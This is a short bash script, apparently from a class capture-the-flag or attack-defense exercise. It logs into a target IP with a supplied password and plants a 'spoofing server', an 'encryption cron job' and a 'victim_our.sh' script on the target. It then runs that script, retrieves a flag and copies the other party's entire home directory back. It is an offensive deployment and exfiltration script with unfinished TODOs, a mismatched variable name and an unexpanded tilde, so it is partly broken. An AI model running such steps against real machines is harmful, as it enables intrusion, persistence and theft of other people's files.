 #!/bin/bash

IP=$1
PASSWORD=$2
OUR_USER=$3

# Create folder for data on our vm
mkdir "~/vms/${IP}"

# Save password to our folder
echo "${PASSWORD}" > "~/vms/${IP}/pwd"

# ------------------ set up spoofing server
# copy new instance of spoofing server
# TODO - add correct folders copy
scp -r "/home/class/fun/spoofer" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer"
# TODO - execute it

# Copy encryption cron job
scp -r "/home/class/fun/spoofer/cron" "${OUR_USR}@${IP}:/home/${OUR_USR}/spoofer/cron"

# Copy victim_our.sh
scp -r "/home/class/fun/victim_our.sh" "${OUR_USR}@${IP}:/home/${OUR_USR}/victim_our.sh"

# Exec victim
ssh "${OUR_USER}@${IP}" "/home/${OUR_USR}/victim_our.sh"

# Copy flag home
scp -r "${OUR_USR}@${IP}:/home/${OUR_USR}/a02_flag" "/home/class/vms/${IP}/a02_flag"

# Copy their folder
scp -r "class@${IP}:/home/class" "/home/class/fun/${IP}/home"